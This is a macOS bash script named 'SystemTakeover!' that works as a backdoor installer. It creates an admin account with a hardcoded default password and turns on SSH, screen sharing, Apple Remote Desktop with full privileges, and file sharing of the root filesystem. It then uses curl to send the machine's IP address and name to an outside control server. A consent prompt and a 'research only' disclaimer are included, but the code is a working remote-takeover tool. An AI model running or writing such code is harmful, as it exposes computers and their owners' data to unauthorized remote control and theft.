#!/bin/bash

################################################################################################

#   _____           _              _______    _                            _
#  / ____|         | |            |__   __|  | |                          | |
# | (___  _   _ ___| |_ ___ _ __ ___ | | __ _| | _____  _____   _____ _ __| |
#  \___ \| | | / __| __/ _ \ '_ ` _ \| |/ _` | |/ / _ \/ _ \ \ / / _ \ '__| |
#  ____) | |_| \__ \ ||  __/ | | | | | | (_| |   <  __/ (_) \ V /  __/ |  |_|
# |_____/ \__, |___/\__\___|_| |_| |_|_|\__,_|_|\_\___|\___/ \_/ \___|_|  (_)
#          __/ |
#         |___/

# SystemTakeover! Version 1.0 Build 20200228

# This script enables a newly-created account to remotely control a computer.
# This script is meant for research purposes only and any malicious usage of this script is strictly prohibited.

# Script made with love by F.Z.

# This script is licensed under the CC-BY-NC-ND 4.0 International License. To view a copy of this license, please visit http://creativecommons.org/licenses/by-nc-nd/4.0/.

# LEGAL NOTICE: THIS SCRIPT IS PROVIDED FOR EDUCATIONAL USE ONLY. IF YOU ENGAGE IN ANY ACTIVITY THAT VIOLATES THE LAWS OR THE LOCAL RULES, THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT. BY USING THIS SCRIPT YOU AGREE WITH THESE TERMS.

# To view the uploaded data, visit https://control.franks-server.ml/get.php?token=ZG1semFYUnZjZz09

################################################################################################

# Change the default username and password here
USERNAME="remote"
PASS="remoteaccess"

################################################################################################

clear

base64 -D <<<"ICAgX19fX18gICAgICAgICAgIF8gICAgICAgICAgICAgIF9fX19fX18gICAgXyAgICAgICAgICAgICAgICAgICAgICAgICAgICBfIAogIC8gX19fX3wgICAgICAgICB8IHwgICAgICAgICAgICB8X18gICBfX3wgIHwgfCAgICAgICAgICAgICAgICAgICAgICAgICAgfCB8CiB8IChfX18gIF8gICBfIF9fX3wgfF8gX19fIF8gX18gX19fIHwgfCBfXyBffCB8IF9fX19fICBfX19fXyAgIF9fX19fIF8gX198IHwKICBcX19fIFx8IHwgfCAvIF9ffCBfXy8gXyBcICdfIGAgXyBcfCB8LyBfYCB8IHwvIC8gXyBcLyBfIFwgXCAvIC8gXyBcICdfX3wgfAogIF9fX18pIHwgfF98IFxfXyBcIHx8ICBfXy8gfCB8IHwgfCB8IHwgKF98IHwgICA8ICBfXy8gKF8pIFwgViAvICBfXy8gfCAgfF98CiB8X19fX18vIFxfXywgfF9fXy9cX19cX19ffF98IHxffCB8X3xffFxfXyxffF98XF9cX19ffFxfX18vIFxfLyBcX19ffF98ICAoXykKICAgICAgICAgIF9fLyB8ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICB8X19fLyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg"
echo
echo

echo "SystemTakeover! Version 1.0 Build 20200228"
echo
printf "\e[38;5;011m"
printf "\e[48;5;009m"
echo "WARNING: THIS SCRIPT WOULD ENABLE THE REMOTE MANAGEMENT FEATURES ON YOUR LAPTOP."
echo "THIS CAN LEAD TO SECURITY RISKS AND POSSIBLE DATA THEFT."
echo

printf "\e[0m"

read -r -p "Are you sure you want to continue? [y/N] " response
if [ -z "$response" ]
then
      response="n"
fi
case "$response" in
    [yY][eE][sS]|[yY])
        echo
        echo "This script requires an administrator password."
        echo "Please enter your password below."
        echo
        
        # Create admin account
        sudo dscl . -create /Users/${USERNAME} &>/dev/null
        sudo dscl . -create /Users/${USERNAME} UserShell /bin/bash &>/dev/null
        sudo dscl . -create /Users/${USERNAME} RealName "${USERNAME}" &>/dev/null
        sudo dscl . -create /Users/${USERNAME} UniqueID 1984 &>/dev/null # See this reference?
        sudo dscl . -create /Users/${USERNAME} PrimaryGroupID 1000 &>/dev/null
        sudo dscl . -create /Users/${USERNAME} NFSHomeDirectory /Local/Users/${USERNAME} &>/dev/null
        sudo dscl . -passwd /Users/${USERNAME} ${PASS} &>/dev/null
        sudo dscl . -append /Groups/admin GroupMembership ${USERNAME} &>/dev/null

        # Create user group
        sudo dseditgroup com.apple.access_ssh &>/dev/null
        sudo dseditgroup -o create -q com.apple.access_ssh &>/dev/null

        # Add account to user group
        sudo dseditgroup -o edit -a ${USERNAME} -t group com.apple.access_ssh &>/dev/null
        
        # Enable remote login
        sudo systemsetup -setremotelogin on &>/dev/null
        sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist &>/dev/null # Fallback
        
        # Enable screen sharing (required for remote management)
        sudo defaults write /var/db/launchd.db/com.apple.launchd/overrides.plist com.apple.screensharing -dict Disabled -bool false &>/dev/null
        sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.screensharing.plist &>/dev/null

        # Enable remote management
        sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -off -restart -agent -privs -all -allowAccessFor -allUsers &>/dev/null # kickstart was deprecated in 10.14 and later - see https://support.apple.com/en-us/HT209161
        
        # Enable file sharing
        sudo AppleFileServer &>/dev/null
        sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.AppleFileServer.plist &>/dev/null
        sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smbd.plist &>/dev/null
        sudo sharing -a / -n "root" -s 111 -g 111 &>/dev/null

        # Send IP address to db
        IP=$(ipconfig getifaddr en0)
        COMNAME=$(scutil --get ComputerName)
        sudo curl --data "ip=${IP}&name=${COMNAME}" https://control.franks-server.ml/index.php &>/dev/null
        
        clear
        echo
        echo "Script has finished running. Your computer is now accessible through IP address ${IP}."
        echo
        echo "To undo what SystemTakeover! has done to your computer, run SystemTakeBack!.app or visit https://github.com/frankzhang05/systemtakeover/releases to download if it is not provided."
        echo
        exit 0
        ;;
    *)
        exit 1
        ;;
esac
